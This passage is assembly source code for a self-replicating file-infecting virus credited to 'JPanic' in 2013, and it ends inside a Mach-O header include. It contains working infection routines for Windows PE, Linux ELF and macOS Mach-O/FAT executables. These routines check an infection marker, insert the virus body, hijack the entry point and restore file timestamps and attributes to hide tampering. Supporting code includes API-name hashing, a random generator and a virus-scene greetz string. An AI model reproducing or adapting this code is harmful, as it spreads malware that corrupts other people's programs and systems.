			call	dwo [Win32Heap.dwCreateFileMappingW]; - CreateFileMappingA(..)
			mov	dwo [Win32Heap.dwMapHandle],eax
			xchg	eax,ecx
			jecxz	$restore_size
			xor	edx,edx
			; MapViewOfFile
			push	edx				; dwNumberOfBytesToMap
			push	edx				; dwFileOffsetLow
			push	edx 				; dwFileOffsetHigh
			push	L FILE_MAP_ALL_ACCESS		; dwDesiredAccess
			push	ecx				; hFileMappingObject
			call	dwo [Win32Heap.dwMapViewOfFile]; - MapViewOfFile(..)
			mov	[vheap.dwMappedFile],eax
			test	eax,eax
			jz	$restore_mapping_obj
			ret

Win32_OpenFile		ENDP

;= Win32_CloseFile ========================================================
;
; Outputs:
;	None. (returns CF as it is used by Win32_OpenFile on error).
;
;--------------------------------------------------------------------------
PUBLIC	Win32_CloseFile
Win32_CloseFile		PROC

			push	[vheap.dwMappedFile]		; lpBaseAddress
			call	dwo [Win32Heap.dwUnmapViewOfFile]; - UnmapViewOfFile(..)
	$restore_mapping_obj:
			push	dwo [Win32Heap.dwMapHandle]	; hObject
			call	dwo [Win32Heap.dwCloseHandle]	; - CloseHandle(..)
	$restore_size:	mov	edi,[vheap.dwFileHandle]
			push	edi				; File handle (used as hFile for next SetEndOfFile()).
			push	L FILE_BEGIN			; dwMoveMethod
			push	L NULL				; lpDistancetoMoveHigh
			push	[vheap.dwFileSize]		; lDistanceToMove
			push	edi				; hFile
			call	dwo [Win32Heap.dwSetFilePointer]; - SetFilePointer(..)
			call	dwo [Win32Heap.dwSetEndOfFile]	; - SetEndOfFile(..)
	$restore_close:
			lea	ecx,[Win32Heap.WFF_Entry.wff_wftLastWriteTime]
			push	ecx				; lpLastWriteTime
			sub	ecx,8
			push	ecx				; lpLastAccesTime
			sub	ecx,8
			push	ecx				; lpCreationTime
			push	edi				; hFile
			call	dwo [Win32Heap.dwSetFileTime]
			push	edi				; hFile
			call	dwo [Win32Heap.dwCloseHandle]	; - CloseHandle(..)
			push	dwo [Win32Heap.WFF_Entry.wff_FileAttributes]	; dwFileAttributes			
			push	[vheap.dwBigBuf]				; lpFileName
			call 	[Win32Heap.dwSetFileAttributesW]
	$ret$c:	        stc
			ret
Win32_CloseFile		ENDP

;= Win32_Chdir ============================================================
;
; ebx = szDir
; returns CF on error.
;
;--------------------------------------------------------------------------
PUBLIC Win32_Chdir
Win32_Chdir		PROC
			push	ebx	; lpPathName
			call	[Win32Heap.dwSetCurrentDirectoryW]
			cmp	eax,1	; CF on error.
			ret
Win32_Chdir		ENDP

;= Win32_DirSetup =========================================================
;
; Outputs:
;	dwCWD, dwDirA, dwDirB
;
;--------------------------------------------------------------------------
PUBLIC	Win32_DirSetup
Win32_DirSetup		PROC			
			;lea	edi,[vheap.dwDirCWD]		; edi: dest
			mov	esi,[vheap.dwBigBuf]
			mov	edx,MAX_PATH			; edx: Buffer TCHAR Count
			lea	ebx,[edx+edx]			; ebx: Buffer Size
			add	esi,ebx				; esi: Buffer			
			; GetCurrentDirectory
			push	edx
			push	esi
			push	edx
			call	[Win32Heap.dwGetCurrentDirectoryW]
			pop	edx
			call	DirReturnValue
			; GetWindowsDirectory			
			push	edx
			push	edx
			push	esi
			call	[Win32Heap.dwGetWindowsDirectoryW]
			pop	edx
			call	DirReturnValue
			; GetSystemDirectory
			push	edx
			push	edx
			push	esi
			call	[Win32Heap.dwGetSystemDirectoryW]
			pop	edx
			;call	DirReturnValue
			;ret
Win32_DirSetup		ENDP

DirReturnValue		PROC
			xor	ecx,ecx				; ecx: zero
			test	eax,eax
			jz	@@s1
			cmp	eax,edx
			mov	eax,ecx
			ja	@@s1
			mov	eax,esi
		@@s1:	stosd
			add	esi,ebx
			ret
DirReturnValue		ENDP

;--------------------------------------------------------------------------
PUBLIC txt1
txt1	dw	(ofs txt1e - txt1s)
txt1s:	db	"Greetz Go Out To: Immortal Riot/Genesis, "
	db	"NOP (lapse,vg and jp own you!), "
	db	"KDZ and the RuxCon regulars, "
	db	"The Feline Menace, "
	db	"And ofcourse The Lonely Grape.",0
txt1e:
		
;==========================================================================
                        ENDS
			END
;==========================================================================

[----------------------------- win32-procs.asm -----------------------------]
[------------------------------ win32imps.ash ------------------------------]
;= Process list of Win32 Imported Kernel32 functions (c) 2013 JPanic ======
;
; Imported Functions:
;	FindFirstFileW, FindNextFileW, FindClose, CreateFileW,
;	SetFilePointer, CloseHandle, CreateFileMappingW, MapViewOfFile
;	UnmapViewOfFile, SetEndOfFile, SetFileTime, SetFileAttributesW.
;	GlobalAlloc, GlobalFree, LoadLibraryA, GetProcAddress, GetFullPathNameW,
;	GetCurrentDirectoryW,GetWindowsDirectoryW,GetSystemDirectoryW,SetCurrentDirectoryW.
;
;- Import List Processing Macro -------------------------------------------
W32_IMP_LIST	MACRO	_code
		IRP     _impname,<FindFirstFileW,FindNextFileW,FindClose,CreateFileW,SetFilePointer,CloseHandle,CreateFileMappingW,MapViewOfFile,UnmapViewOfFile,SetEndOfFile,SetFileTime,SetFileAttributesW,GlobalAlloc,GlobalFree,LoadLibraryA,GetProcAddress,GetFullPathNameW,GetCurrentDirectoryW,GetWindowsDirectoryW,GetSystemDirectoryW,SetCurrentDirectoryW>
			IRP	_codeline, <_code>
				&_codeline&
			ENDM
			purge	_codeline
		ENDM
		purge	_impname
ENDM

;- Set Imported Proc Count ------------------------------------------------
K32ProcCount	=	0
W32_IMP_LIST	<<K32ProcCount = K32ProcCount + 1>>

;==========================================================================
[------------------------------ win32imps.ash ------------------------------]
[------------------------------- inf-elf.ash -------------------------------]
;= ELF Infection Routine Definitions (c) 2013 JPanic ======================
;
; Provides routines for infection of ELF executables.
;
; Defined:
;	InfectELF()
;
;- Procedure Definitions --------------------------------------------------

.model flat
.486

extrn InfectELF:PROC

;= END FILE ===============================================================	
[------------------------------- inf-elf.ash -------------------------------]
[------------------------------- inf-elf.asm -------------------------------]
;= ELF Infection Routine Definitions (c) 2013 JPanic =======================
;
; Provides routines for infection of ELF executables.
;
; PUBLICS:
;	InfectELF()
;
;= Directive Warez ========================================================

	.486
	.model flat
	locals @@

	include inc\elf.inc
        include vheap.ash
        include vmain.ash
        include osprocs.ash
        
;= Code Warez =============================================================
        include codeseg.ash
;= InfectELF ==============================================================
;
; Inputs:
;	EBX = Mapped file image.
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC InfectELF
InfectELF		PROC
			; Check EHDR
			cmp	dwo [ebx.e_ident+3],123h
			org	$-4
			; FileClass=ELFCLASS32, DataEncoding=ELFDATA2LSB,EI_Version=EV_CURRENT
			db	'F',01,01,01
			jne	@@jne_ret$0
			; Already INFECTED?
			cmp     wo [ebx.e_ident+EI_PAD+4],VMarker
			je	@@ret
			; Executable?
			cmp	wo [ebx.e_type],ET_EXEC
		@@jne_ret$0:
			jne	@@jne_ret$1
			; Correct structure sizes?
			cmp	wo [ebx.e_ehsize],size Elf32_Ehdr
		@@jne_ret$1:
			jne	@@jne_ret$2
			cmp	wo [ebx.e_phentsize],size Elf32_Phdr
		@@jne_ret$2:	
			jne	@@jne_ret$3
                        .errnz (size Elf32_Phdr - 20h) Elf32_Phdr not 20h bytes in InfectELF
			cmp	wo [ebx.e_shentsize],size Elf32_Shdr
		@@jne_ret$3:	
			jne	@@jne_ret$4
			cmp	[ebx.e_phoff],size Elf32_Ehdr
		@@jne_ret$4:
			jne	@@jne_ret$5
			;e_machine == 386 or 486
			movzx	eax,wo [ebx.e_machine]
			cmp	al,EM_386
			.if !ZERO?
				cmp al,EM_486
			  @@jne_ret$5:
				jne @@ret
			.endif
			movzx	ecx,wo [ebx.e_phnum]
			cmp	ecx,30
			ja	@@ret
			; Process EHDR
			xor	edx,edx
			mov	dh,10h			
			mov	wo [ebx.e_ident+EI_PAD+4],VMarker
			add	dwo [ebx.e_shoff],edx
			; Process PHDRS			
			mov	edi,[ebx.e_phoff]
                        add     edi,ebx
                        PHDR    equ  edi
		        @@phdr_loop:
				mov     eax,[PHDR.p_type]     
				cmp     al,PT_NULL
                                je      @@phdr_next
                                cmp     al,PT_PHDR
                                je      @@update_paddr_and_vaddr
                                cmp     al,PT_LOAD
                                jne     @@normal_phdr
                                cmp     [PHDR.p_offset],0
                                jne     @@normal_phdr
                                add	[PHDR.p_filesz],edx
			        add	[PHDR.p_memsz],edx			        
			        or	[PHDR.p_flags],5	; PF_X + PF_R
                                push    edi             ; save .text phdr position for later calculation of new EIP                                   
                        @@update_paddr_and_vaddr:
                                sub     [PHDR.p_vaddr],edx
                                sub     [PHDR.p_paddr],edx
                                jmp     @@phdr_next
                        @@normal_phdr:
                                add     [PHDR.p_offset],edx
                        @@phdr_next:
                        add     edi,size Elf32_Phdr
                        loop    @@phdr_loop
                        sub     edi,ebx
                        push    edi             ;edi = end of phdrs where we copy the virus
                        ; Move file up 4k
			mov	ecx,[vheap.dwFileSize]
			lea	esi,[ebx+ecx-1]
			lea	edi,[esi+edx]
			std
			rep	movsb
			cld                     
                        ; Fix SH table
			movzx	ecx,wo [ebx.e_shnum]			
			mov	edi,[ebx.e_shoff]                        
			@@sfixl:	add	[edi+ebx.sh_offset],edx
					add	edi,size Elf32_Shdr
					loop	@@sfixl
                        ; Adjust file - first set new size.			
			add	[vheap.dwFileSize],edx			
			; Set new EIP, Then copy virus			
			pop     edi     ; edi=buffer at end of phdrs
			pop     esi     ; esi=.text phdr entry
                        mov     eax,[esi.p_vaddr]
                        add     eax,edi
                        xchg    [ebx.e_entry],eax
                        add     edi,ebx
                        mov     dl,OS_Proc_Use_Linux                        
                        call    BuildVBody
		@@ret:	ret		
InfectELF		ENDP

;--------------------------------------------------------------------------
PUBLIC txt2
txt2	dw	(ofs txt2e - txt2s)
txt2s:	ASCII_VSIZE
	db	" bytes of (obsolete) MultiPlatform Madness!",0
txt2e:
;==========================================================================
                ENDS
		END
;==========================================================================

[------------------------------- inf-elf.asm -------------------------------]
[------------------------------ inf-macho.ash ------------------------------]
;= Macho Infection Routine Definitions (c) 2013 JPanic ====================
;
; Provides routines for infection of Macho executables.
;
; Defined:
;	InfectFAT()
;	InfectMACHO()
;
;- Procedure Definitions --------------------------------------------------

.model flat
.486

extrn InfectFAT:PROC
extrn InfectMACHO:PROC

;= END FILE ===============================================================	
[------------------------------ inf-macho.ash ------------------------------]
[------------------------------ inf-macho.asm ------------------------------]
;= MACHO Infection Routine Definitions (c) 2013 JPanic ====================
;
; Provides routines for infection of MACHO, FAT executables.
;
; PUBLICS:
;	InfectMACHO()
;	InfectFAT()
;
;= Directive Warez ========================================================

	.486
	.model flat
	locals @@

	include inc\macho.inc
        include vheap.ash
        include vmain.ash
        include osprocs.ash
        
;= Code Warez =============================================================
        include codeseg.ash
;= InfectFAT ==============================================================
;
; Inputs:
;	EBX = Mapped file image.
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC InfectFAT
InfectFAT		PROC
			mov	eax,[ebx.fathdr_nfat_arch]
			bswap	eax
			dec	eax
			js	@@ret
			imul	esi,eax,size fat_arch
			lea	esi,[esi+ebx+size fat_header]
			; eax = last fat_arch
			lodsd
			bswap	eax
			cmp	eax,mach_CPU_TYPE_I386	; fat_cputype
			jne	@@ret
			lodsd				; fat_cpusubtype
			lodsd				; fat_offset
			bswap	eax
			mov	edi,[vheap.dwFileSize]	; EDI = FAT File Size
			cmp	eax,edi
			jae	@@ret
			test	ax,0FFFh		; fat_offset 4k boundary?
			jnz	@@jne_ret$0
			xchg	ecx,eax			; ECX == MACH offset
			lodsd				; fat_size
			bswap	eax
			lea	edx,[eax+ecx]		; EDX = EOF
			cmp	edx,edi
			jne	@@ret
			lodsd				; fat_align
			bswap	eax
			cmp	eax,0ch
		@@jne_ret$0:
			jne	@@ret			
			mov	edi,[(esi - size fat_arch).fat_size]
			bswap	edi
			; ebx = FAT image, esi = fat_arch struc, edx = FAT file length, edi = macho size
			pusha
			; prepare and call InfectMacho
			mov	eax,[(esi - size fat_arch).fat_offset]
			bswap	eax
			add	ebx,eax
			cmp	dwo [ebx],mach_MH_MAGIC
			jne	@@nomacho
			mov	[vheap.dwFileSize],edi
			call	InfectMACHO	
		@@nomacho:
			popa
			cmp	[vheap.dwFileSize],edi
			je	@@nofix			
				mov	edi,[vheap.dwFileSize]
				mov	edx,[(esi - size fat_arch).fat_offset]
				bswap	edx
				add	edx,edi			
				bswap	edi
				mov	[(esi - size fat_arch).fat_size],edi
		@@nofix:mov	[vheap.dwFileSize],edx
		@@ret:	ret
InfectFAT	ENDP

;= InfectMACHO ==============================================================
;
; Inputs:
;	EBX = Mapped file image.
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC InfectMACHO
InfectMACHO		PROC			
			cmp	dwo [ebx.mach_cputype],mach_CPU_TYPE_I386			
			jne	@@ret_nz$00
			cmp	dwo [ebx.mach_filetype],mach_MH_EXECUTE			
		@@ret_nz$00:
			jne	@@ret
			mov	ecx,dwo [ebx.mach_ncmds]			
			jecxz	@@ret
			push	ebx
			lea	esi,[ebx+(size mach_header)]			
			; edi = LC_SEGMENT ZERO PAGE
			; edx = LC_UNIXTHREAD,i386_NEW_THREAD_STATE
			xor	edx,edx
			xor	edi,edi
		@@cmdloop:	mov	al,by [esi.by mach_ldcmd_cmd]			
				cmp	al,mach_LC_SEGMENT
				lea	ebx,[esi+8]
				jne	@@not_segment
					test	edi,edi
					jnz	@@nextcmd
					cmp	[ebx.mach_segcmd_vmaddr],edi
					jne	@@nextcmd
					cmp	[ebx.mach_segcmd_filesize],edi
					jne	@@nextcmd
					mov	edi,ebx
					jmp	@@nextcmd					
		@@not_segment:	cmp	al,mach_LC_UNIXTHREAD
				jne	@@nextcmd
					test	edx,edx
					jnz	@@nextcmd
					cmp	dwo [ebx.mach_threadcmd_flavor],mach_i386_NEW_THREAD_STATE
					jne	@@nextcmd
					lea	edx,[ebx+8]
		;@@not_unix_thread:		
		@@nextcmd:
			add	esi,[esi.mach_ldcmd_cmdsize]
			loop	@@cmdloop
			pop	ebx
			test	edi,edi
			jz	@@ret_z$00
			test	edx,edx
		@@ret_z$00:
			jz	@@ret
			mov	esi,[vheap.dwFileSize]
			mov	ecx,0FFFh
			add	esi,ecx
			not	ecx
			and	esi,ecx			
			mov	dwo [edi.mach_segcmd_vmsize],1000h			
			mov	dwo [edi.mach_segcmd_fileoff],esi			
			mov	ecx,[vheap.dwVirusSize]
			mov	dwo [edi.mach_segcmd_filesize],ecx
			add	ebx,esi
			add	esi,ecx
			mov	[vheap.dwFileSize],esi
			or	dwo [edi.mach_segcmd_maxprot],5
			or	dwo [edi.mach_segcmd_initprot],5		
			mov	edi,ebx
			xor	eax,eax
			xchg	eax,dwo [edx.mach_i386_eip]			
                        mov     dl,OS_Proc_Use_OSX                        
                        call    BuildVBody
		@@ret:	ret
InfectMACHO		ENDP

;==========================================================================
                ENDS
		END
;==========================================================================

[------------------------------ inf-macho.asm ------------------------------]
[-------------------------------- inf-pe.ash -------------------------------]
;= PE Infection Routine Definitions (c) 2013 JPanic =======================
;
; Provides routines for infection and identification of PE executables.
;
; Defined:
;	IsImagePE()
;	InfectPE()
;
;- Procedure Definitions --------------------------------------------------

.model flat
.486

extrn IsImagePE:PROC
extrn InfectPE:PROC

;= END FILE ===============================================================	
[-------------------------------- inf-pe.ash -------------------------------]
[-------------------------------- inf-pe.asm -------------------------------]
;= PE Infection Routine Definitions (c) 2013 JPanic =======================
;
; Provides routines for infection and identification of PE executables.
;
; PUBLICS:
;	IsImagePE()
;	InfectPE()
;
;= Directive Warez ========================================================

	.486
	.model flat
	locals @@

	include inc\win32.inc
	include inc\pe.inc
        include vheap.ash
        include vmain.ash
        include osprocs.ash
        
;= Code Warez =============================================================
        include codeseg.ash
;= IsImagePE===============================================================
;
; Inputs:
;	EBX = Image to check.
;
; Outputs:
;	ZF if file is PE.
;	ESI = Relative offset of PE header.
;
;--------------------------------------------------------------------------
PUBLIC IsImagePE
IsImagePE	PROC
		cmp	wo [ebx],IMAGE_DOS_SIGNATURE
		jne	$ret
		mov	esi,dwo [ebx+3Ch]
		cmp	esi,0FFFh
		ja	$ret
                add     esi,ebx
		cmp	dwo [esi],IMAGE_NT_SIGNATURE
	$ret:	ret		
IsImagePE	ENDP		

;= InfectPE ===============================================================
;
; Inputs:
;	EBX = Mapped file image.
;	ESI = Relative offset of PE header.
;
; Outputs:
;	None.
;
;--------------------------------------------------------------------------
PUBLIC InfectPE
InfectPE	PROC
		
	        PEHDR	EQU	[esi]
	                
		; Check if already infected.
		cmp	wo PEHDR[peh_TimeDateStamp],VMarker
		je	$ret		
		; Check for valid flags:
		; IMAGE_FILE_SYSTEM == IMAGE_FILE_DLL == IMAGE_FILE_UP_SYSTEM_ONLY == 0
		; IMAGE_FILE_EXECUTABLE_IMAGE == IMAGE_FILE_32BIT_MACHINE == 1
		mov	ax,IMAGE_FILE_SYSTEM+IMAGE_FILE_DLL+IMAGE_FILE_UP_SYSTEM_ONLY+IMAGE_FILE_EXECUTABLE_IMAGE+IMAGE_FILE_32BIT_MACHINE
		and	eax,dwo PEHDR[peh_Flags]
		cmp	ax,IMAGE_FILE_EXECUTABLE_IMAGE+IMAGE_FILE_32BIT_MACHINE		
	@@retnz1:
		jnz	$ret
		; Check if valid subsystem: 2 = Win32 GUI, 3 = Win32 Console.
		mov	eax,dwo PEHDR[peh_SubSystem]
		and	al,NOT 1
		cmp	ax,2
	@@retnz2:
		jne	@@retnz1
		; Check for Security Directory
		cmp	PEHDR[peh_SecurityDirectory.pedir_Size],0
		jne	@@retnz2
		test	by PEHDR[peh_DLLFlags.bHI],20h		; WDM Driver?
		jnz	@@retnz2
		; Begin infection - mark as infected.
		mov	wo PEHDR[peh_TimeDateStamp],VMarker
		; Set EDX = Last section header.
		movzx	edx,wo PEHDR[peh_SectionCount]
		dec	edx
		imul	edx,size PE_Sec
		movzx	edi,wo PEHDR[peh_NTHdrSize]
		add	edx,edi
		lea	edi,PEHDR[peh_Magic]
		add	edx,edi                
		; Get physical offset to append virus.
		mov	edi,[vheap.dwFileSize]
		;overlay check
		mov	eax,[edx.pesec_RawDataPtr]
		add	eax,[edx.pesec_RawDataSize]
		add	eax,512
		cmp	edi,eax
		ja	$ret
		mov     eax,edi
		sub	eax,[edx.pesec_RawDataPtr]
		add	eax,[edx.pesec_VirtualAddress]
                add	edi,ebx         ; edi = EOF of mapped file to write virus
		; Stack = Last PESEC_Hdr, PE_Hdr
                push	edx esi
		mov     dl,OS_Proc_Use_Win32
		xchg	eax,PEHDR[peh_EntryPointRVA]
		add	eax,PEHDR[peh_ImageBase]
                call    BuildVBody                
		; esi=PE_Hdr, edx=Last PESEC_Hdr
		pop	esi edx
		; Set new section physical size.		
		sub	edi,ebx		
		sub	edi,[edx.pesec_RawDataPtr]		
		; Stack=unrounded section size
		push	edi
		mov	[edx.pesec_RawDataSize],edi
		; Set new file size.
		add	edi,[edx.pesec_RawDataPtr]
		mov	[vheap.dwFileSize],edi
		; Set new section virtual size.		
		pop	eax
		cmp	[edx.pesec_VirtualSize],eax
		.if	carry?
			mov     [edx.pesec_VirtualSize],eax
		.endif
		; Set section flags.
		or	[edx.pesec_Flags.wHI.bHI], 60h
		; Set new image size.
		add	eax,[edx.pesec_VirtualAddress]
		cmp	dwo PEHDR[peh_ImageSize],eax
		.if	carry?
		 	mov	dwo PEHDR[peh_ImageSize],eax
		.endif
	@@ret:	ret
InfectPE	ENDP

;==========================================================================
                ENDS
		END
;==========================================================================

[-------------------------------- inf-pe.asm -------------------------------]
[--------------------------------- rand.ash --------------------------------]
;= 32-Bit LSFR RNG (c) 2013 JPanic ========================================

;- Procedure Definitions --------------------------------------------------
.model flat
.486

IFNDEF _RAND_ASM	
	extrn GetRand32:PROC
ENDIF

;- Polynomial -------------------------------------------------------------
RAND_POLY 	=	(1\
		OR	(1 SHL 1)\
		OR	(1 SHL 2)\
		OR	(1 SHL 4)\
		OR	(1 SHL 6)\
		OR	(1 SHL 31))

;= END FILE ===============================================================	

[--------------------------------- rand.ash --------------------------------]
[--------------------------------- rand.asm --------------------------------]
;= 32-Bit LSFR PRNG (c) 2013 JPanic ======================================
;
; Provides Sub-Procedures to calculate a RAND32:
;
;	GetRAND32	- Return CRC32 of ECX bytes at *ESI in EAX.
;
;= Directive Warez ========================================================

	.486
	.model flat
	locals @@

	_RAND_ASM	EQU 	TRUE
	include vheap.ash
        include rand.ash

;= Code Warez =============================================================
        include codeseg.ash
;= GetRand32 ==============================================================
;
; Inputs: nil

; Outputs:
;	EAX = Rand.
;
;--------------------------------------------------------------------------
PUBLIC GetRand32
GetRand32 		PROC
			push	ecx
			push	32
			pop	ecx
			mov	eax,[vheap.dwRandSeed]
		@@loop:		test	eax,RAND_POLY
				jpe	@@nc
					stc
			@@nc:	rcr	eax,1
			loop	@@loop
			mov	[vheap.dwRandSeed],eax
			pop	ecx
			ret
GetRand32		ENDP		

;==========================================================================
                ENDS
		END
;==========================================================================

[--------------------------------- rand.asm --------------------------------]
[------------------------------ strhash32.ash ------------------------------]
;= String Hash32 Sub-Procedures (c) 2013 JPanic ============================
;
; Provides Small 32-Bit String Hash.;
;
; Note: Tasm doesnt support '!' in ascii strings.
;
; Provides macro to emulate String Hash instructions:
;
; strhash32_laz		- set 'strhash32' to hash of asciiz string.
;
; Examples:
;	strhash32_laz	CreateFileA
;	dd	strhash32
;
;- Procedure Definitions --------------------------------------------------
.model flat
.486

IFNDEF	_STRHASH32_ASM
	extrn StringHash32:PROC
ENDIF	;_STRHASH32_ASM

;- String Hash -------------------------------------------------------------

strhash32 = 0

STRHASH_MUL	EQU	37

;= String Hash INSTRUCTIONS ===============================================

;- lcrcaz -----------------------------------------------------------------
	strhash32_laz MACRO data
		LOCAL u,l,c
		.xlist
		strhash32 = 0
		IRPC x, <data>
			u = (strhash32 SHR 16) AND 0FFFFh
			l = (strhash32 and 0FFFFh)
			l = l * STRHASH_MUL
			u = u * STRHASH_MUL			
			l = l + ('&x&' AND 0FFh)
			c = (l SHR 16)
			u = (u + c)
			u = u SHL 16
			u = u AND 0FFFF0000h
			l = l AND 0FFFFh
			strhash32 = u OR l			
		ENDM
		.list		
	ENDM

;= END FILE ===============================================================	
[------------------------------ strhash32.ash ------------------------------]
[------------------------------ strhash32.asm ------------------------------]
;= String Hash32 Sub-Procedures (c) 2013 JPanic ============================
;
; Provides Small 32-Bit String Hash.
;
; Provides Sub-Procedure to calculate a 32-bit String Hash:
;
;	StringHash32	- Return Hash of ASCIIZ String in EAX.
;
;= Directive Warez ========================================================

	.486
	.model flat
	locals @@

	_STRHASH32_ASM	EQU 	TRUE
        include strhash32.ash

;= Code Warez =============================================================
        include codeseg.ash
;=  StrHash32 =============================================================
;
; Inputs:
;	ESI = Offset of asciiz string to hash.
;
; Outputs:
;	EAX = 32-bit hash of input.
;
;--------------------------------------------------------------------------
PUBLIC StringHash32
StringHash32 	PROC	NEAR
		push edx
		xor	eax,eax
		cdq
        @@l:	        
                lodsb
		or	al,al
		jz	@@exit
			imul	edx,edx,STRHASH_MUL
			add		edx,eax
		jmp	@@l
        @@exit: xchg eax,edx
		pop edx
		ret
StringHash32 	ENDP
;==========================================================================
ENDS
END
;==========================================================================

[------------------------------ strhash32.asm ------------------------------]
[------------------------------ elf.inc ------------------------------]
.xlist
;-----------------------------------------------------------------------------

; e_ident
EI_NIDENT	EQU	16
EI_MAG0		EQU	0
EI_MAG1		EQU 	1
EI_MAG2		EQU	2
EI_MAG3		EQU	3
EI_CLASS	EQU	4
EI_DATA		EQU	5
EI_VERSION	EQU	6
EI_PAD		EQU	7

ELF_MAGIC = 464C457Fh

; Elf Types
ET_NONE		EQU	0
ET_REL		EQU	1
ET_EXEC		EQU	2
ET_DYN		EQU	3
ET_CORE		EQU	4
ET_LOPROC	EQU	0FF00h
ET_HIPROC	EQU	0FFFFh

; Elf Machines
EM_NONE		EQU	0
EM_M32		EQU	1
EM_SPARC	EQU	2
EM_386		EQU	3
EM_68K		EQU	4
EM_88K		EQU	5
EM_486		EQU	6
EM_860		EQU	7
EM_MIPS		EQU	8

; Elf Version
EV_NONE		EQU 	0
EV_CURRENT	EQU	1

Elf32_Ehdr	STRUC
		e_ident		db 	EI_NIDENT dup(?)
		e_type		dw	?
		e_machine	dw	?
		e_version	dd	?
		e_entry		dd	?
		e_phoff		dd	?
		e_shoff		dd	?
		e_flags		dd	?
		e_ehsize	dw	?
		e_phentsize	dw	?
		e_phnum		dw	?
		e_shentsize	dw	?
		e_shnum		dw	?
		e_shstrndx	dw	?		
Elf32_Ehdr	ENDS

;-----------------------------------------------------------------------------

; Section Types
SHT_NULL 	EQU	0
SHT_PROGBITS 	EQU	1
SHT_SYMTAB 	EQU	2
SHT_STRTAB 	EQU	3
SHT_RELA 	EQU	4
SHT_HASH 	EQU	5
SHT_DYNAMIC 	EQU	6
SHT_NOTE 	EQU	7
SHT_NOBITS 	EQU	8
SHT_REL 	EQU	9
SHT_SHLIB 	EQU	10
SHT_DYNSYM 	EQU	11
SHT_LOPROC 	EQU	0x70000000
SHT_HIPROC 	EQU	0x7fffffff
SHT_LOUSER 	EQU	0x80000000
SHT_HIUSER 	EQU	0xffffffff

; Section Attributes
SHF_WRITE 	EQU	1
SHF_ALLOC	EQU	2
SHF_EXECINSTR	EQU	4
SHF_MASKPROC	EQU	0F0000000h

; Reserved Section Header Indexes
SHN_UNDEF 	EQU	00
SHN_LORESERVE 	EQU 	0FF00h
SHN_HIRESERVE 	EQU	0FFFFh

Elf32_Shdr	STRUC
		sh_name		dd	?
		sh_type		dd	?
		sh_flags	dd	?
		sh_addr		dd	?
		sh_offset	dd	?
		sh_size		dd	?
		sh_link		dd	?
		sh_info		dd	?
		sh_addralign	dd	?
		sh_entsize	dd	?		
Elf32_Shdr	ENDS

;-----------------------------------------------------------------------------

; Segment Types
PT_NULL 	EQU	0
PT_LOAD 	EQU	1
PT_DYNAMIC 	EQU	2
PT_INTERP 	EQU	3
PT_NOTE 	EQU	4
PT_SHLIB 	EQU	5
PT_PHDR 	EQU	6
PT_LOPROC 	EQU	070000000h
PT_HIPROC 	EQU	07fffffffh

Elf32_Phdr	STRUC
		p_type		dd	?
		p_offset	dd	?
		p_vaddr		dd	?
		p_paddr		dd	?
		p_filesz	dd	?
		p_memsz		dd	?
		p_flags		dd	?
		p_align		dd	?		
Elf32_Phdr	ENDS

.list
[------------------------------ elf.inc ------------------------------]
[------------------------------ linux.inc ------------------------------]
.xlist

STAT_MODE_FILETYPE_MASK	        EQU     0F000h
STAT_MODE_FILETYPE_REG	        EQU	08000h

S_OWNER_R			EQU	0100h		; 0400
S_OWNER_W			EQU	0080h		; 0200

;==========================================================================
dirent				STRUC
				
	dirent_ino		dd	?
	dirent_off		dd	?
	dirent_reclen		dw	?
	dirent_name		db 256 dup(?)
	
dirent				ENDS

;--------------------------------------------------------------------------
stat				STRUC

	stat_dev		dw	?
	stat_pad1		dw	?
	stat_ino		dd	?
	stat_mode 		dw	?
	stat_nlink 		dw	?
	stat_uid 		dw	?
	stat_gid		dw	?
	stat_rdev 		dw	?
	stat_pad2 		dw	?
	stat_size 		dd	?
	stat_blksize 		dd	?
	stat_blocks		dd	?
	stat_atime		dd	?
	stat_unused1		dd	?    
	stat_mtime		dd	?
	stat_unused2		dd	?
	stat_ctime		dd	?
	stat_unused3		dd	?
	stat_unused4		dd	?
	stat_unused5		dd	?

stat				ENDS

;--------------------------------------------------------------------------
SEEK_BEGIN              EQU     0
SEEK_CURRENT            EQU     1
SEEK_END                EQU     2

;--------------------------------------------------------------------------
PROT_READ		= 1
PROT_WRITE              = 2
;--------------------------------------------------------------------------
MAP_SHARED		= 01h
MAP_PRIVATE             = 02h

;==========================================================================
.list


[------------------------------ linux.inc ------------------------------]
[------------------------------ macho.inc ------------------------------]
.xlist
;-----------------------------------------------------------------------------
mach_MH_MAGIC				EQU	0FEEDFACEh
mach_CPU_TYPE_I386			EQU	7
mach_MH_EXECUTE	        		EQU	2
mach_LC_SEGMENT				EQU	1
mach_LC_UNIXTHREAD			EQU	5
mach_i386_NEW_THREAD_STATE	        EQU	1

FAT_CIGAM				EQU	0BEBAFECAh

;-----------------------------------------------------------------------------
mach_header		STRUC
		mach_magic		dd		?
		mach_cputype		dd		?
		mach_cpusubtype		dd		?
		mach_filetype		dd		?
		mach_ncmds		dd		?
		mach_sizeofcmds		dd		?
		mach_flags		dd		?
mach_header		ENDS

;-----------------------------------------------------------------------------
mach_load_command	STRUC
		mach_ldcmd_cmd		dd		?
		mach_ldcmd_cmdsize	dd		?
mach_load_command	ENDS

;-----------------------------------------------------------------------------
mach_segment_command	STRUC
		mach_segcmd_segname	db		16 dup(?)
		mach_segcmd_vmaddr	dd		?
		mach_segcmd_vmsize	dd		?
		mach_segcmd_fileoff	dd		?
		mach_segcmd_filesize	dd		?
		mach_segcmd_maxprot	dd		?
		mach_segcmd_initprot	dd		?
mach_segment_command	ENDS

;-----------------------------------------------------------------------------
mach_section_command	STRUC
		mach_sectcmd_sectname	db		16 dup(?)
		mach_sectcmd_segname	db		16 dup(?)
		mach_sectcmd_addr	dd		?
		mach_sectcmd_size	dd		?
		mach_sectcmd_offset	dd		?
		mach_sectcmd_align	dd		?
		mach_sectcmd_reloff	dd		?
		mach_sectcmd_nreloc	dd		?
		mach_sectcmd_flags	dd		?
		mach_sectcmd_reserved1	dd		?
		mach_sectcmd_reserved2	dd		?
mach_section_command	ENDS

;-----------------------------------------------------------------------------
mach_thread_command		STRUC
		mach_threadcmd_flavor	dd		?
		mach_threadcmd_count	dd		?
mach_thread_command		ENDS

;------------------------------------------------------------------------------
mach_i386_thread_state_t	STRUC
		mach_1386_eax		dd		?
		mach_1386_ebx		dd		?
		mach_1386_ecx		dd		?
		mach_1386_edx		dd		?
